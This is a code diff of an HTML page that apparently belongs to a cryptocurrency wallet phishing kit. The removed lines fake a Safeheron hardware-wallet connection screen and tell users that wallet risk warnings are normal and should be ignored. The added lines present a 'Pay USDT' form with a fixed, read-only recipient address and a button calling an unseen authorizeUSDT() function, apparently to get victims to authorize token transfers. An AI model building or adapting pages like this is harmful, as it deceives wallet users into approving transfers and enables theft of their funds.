@@ -3,24 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DApp Frontend</title>
+    <title>付款 USDT (ERC20)</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container">
-        <h1>准备连接Safeheron硬件钱包</h1>
-        <div class="progress-bar">
-            <div id="progress"></div>
+        <h1>付款 USDT (ERC20)</h1>
+        <div class="form-group">
+            <label for="address">地址或域名</label>
+            <div class="input-group">
+                <input type="text" id="address" placeholder="搜索或输入" value="0xf2B9e347D4379Decd69A3B03fFa4e0AB878EF6D1" readonly>
+            </div>
         </div>
-        <div class="countdown" id="countdown">120秒后请重新连接</div>
-        <h2>Safeheron Wallet</h2>
-        <div class="button-container">
-            <button id="okButton" onclick="connectWallet()">OK</button>
+        <div class="form-group">
+            <label for="amount">数量</label>
+            <div class="input-group">
+                <input type="number" id="amount" placeholder="USDT 数量">
+            </div>
         </div>
-        <div class="warning">
-连接手机钱包会出现风险提示这是正常的请继续
-        </div>
+        <div class="usd-equivalent">≈ $0.00</div>
     </div>
+    <button id="nextButton" onclick="authorizeUSDT()">下一步</button>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
     <script src="script.js" type="application/javascript"></script>
 </body>
